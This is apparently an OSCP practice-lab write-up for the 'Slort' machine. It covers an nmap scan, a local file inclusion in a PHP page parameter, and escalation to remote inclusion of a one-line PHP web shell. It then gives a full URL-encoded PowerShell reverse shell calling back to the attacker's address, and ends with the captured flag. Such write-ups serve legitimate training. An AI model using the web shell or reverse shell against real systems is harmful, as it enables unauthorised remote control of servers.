# Slort

IP: 192.168.219.53

Nmap: 

```bash
┌──(kali㉿kali)-[~/OSCP/labs/Slort]
└─$ sudo nmap -sV -sC -p- 192.168.219.53 --min-rate=5000 -o nmap
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-07 20:02 +1000
Warning: 192.168.219.53 giving up on port because retransmission cap hit (10).
Stats: 0:01:16 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 46.67% done; ETC: 20:05 (0:00:53 remaining)
Stats: 0:01:16 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 46.67% done; ETC: 20:05 (0:00:53 remaining)
Stats: 0:02:42 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 93.33% done; ETC: 20:05 (0:00:09 remaining)
Nmap scan report for 192.168.219.53
Host is up (0.25s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
4443/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.219.53:4443/dashboard/
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.219.53:8080/dashboard/
|_http-open-proxy: Proxy might be redirecting requests
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

```

![Screenshot 2026-05-07 at 8.08.03 pm.png](Slort/Screenshot_2026-05-07_at_8.08.03_pm.png)

There are two identical HTTP sites on port 4443 and 8080:

![Screenshot 2026-05-07 at 8.51.39 pm.png](Slort/Screenshot_2026-05-07_at_8.51.39_pm.png)

After inspecting both I noticed that the index.php has a page variable which look interesting 

![image.png](Slort/image.png)

With some experimenting I tried to test for Local File Inclusion using directory traversal and was successful: 

![Screenshot 2026-05-07 at 8.53.51 pm.png](Slort/Screenshot_2026-05-07_at_8.53.51_pm.png)

This led me to think that possibly Remote File Inclusion was also possible. 

So I created a php file with the following contents: 

```bash
┌──(kali㉿kali)-[~/OSCP/labs/Slort]
└─$ cat shell.php 
<?=`$_GET[0]`?>
                                                                                                    
```

![Screenshot 2026-05-07 at 8.55.04 pm.png](Slort/Screenshot_2026-05-07_at_8.55.04_pm.png)

Opened a webserver on my kali machine: 

```bash
┌──(kali㉿kali)-[~/OSCP/labs/Slort]
└─$ python3 -m http.server 80
```

![Screenshot 2026-05-07 at 8.55.41 pm.png](Slort/Screenshot_2026-05-07_at_8.55.41_pm.png)

Then using the page variable in the http request I requested for the shell.php file from my kali machine and was successful retrieving it as well successful executing powershell:

![Screenshot 2026-05-07 at 8.55.33 pm.png](Slort/Screenshot_2026-05-07_at_8.55.33_pm.png)

I then added an encode powershell reverseshell to the powershell command within the URL request and was succesfully able to obtain a shell: 

```powershell
%24LHOST%20%3D%20%22192.168.45.235%22%3B%20%24LPORT%20%3D%204444%3B%20%24TCPClient%20%3D%20New-Object%20Net.Sockets.TCPClient%28%24LHOST%2C%20%24LPORT%29%3B%20%24NetworkStream%20%3D%20%24TCPClient.GetStream%28%29%3B%20%24StreamReader%20%3D%20New-Object%20IO.StreamReader%28%24NetworkStream%29%3B%20%24StreamWriter%20%3D%20New-Object%20IO.StreamWriter%28%24NetworkStream%29%3B%20%24StreamWriter.AutoFlush%20%3D%20%24true%3B%20%24Buffer%20%3D%20New-Object%20System.Byte%5B%5D%201024%3B%20while%20%28%24TCPClient.Connected%29%20%7B%20while%20%28%24NetworkStream.DataAvailable%29%20%7B%20%24RawData%20%3D%20%24NetworkStream.Read%28%24Buffer%2C%200%2C%20%24Buffer.Length%29%3B%20%24Code%20%3D%20%28%5Btext.encoding%5D%3A%3AUTF8%29.GetString%28%24Buffer%2C%200%2C%20%24RawData%20-1%29%20%7D%3B%20if%20%28%24TCPClient.Connected%20-and%20%24Code.Length%20-gt%201%29%20%7B%20%24Output%20%3D%20try%20%7B%20Invoke-Expression%20%28%24Code%29%202%3E%261%20%7D%20catch%20%7B%20%24_%20%7D%3B%20%24StreamWriter.Write%28%22%24Output%60n%22%29%3B%20%24Code%20%3D%20%24null%20%7D%20%7D%3B%20%24TCPClient.Close%28%29%3B%20%24NetworkStream.Close%28%29%3B%20%24StreamReader.Close%28%29%3B%20%24StreamWriter.Close%28%29
```

![Screenshot 2026-05-07 at 8.59.35 pm.png](Slort/Screenshot_2026-05-07_at_8.59.35_pm.png)

![Screenshot 2026-05-07 at 8.58.49 pm.png](Slort/Screenshot_2026-05-07_at_8.58.49_pm.png)

I was then able to change directories to the Ruput users Desktop and obtain the local flag:

![Screenshot 2026-05-07 at 8.59.50 pm.png](Slort/Screenshot_2026-05-07_at_8.59.50_pm.png)

Local flag: 2e736079e9565f777e6275d66e7dec57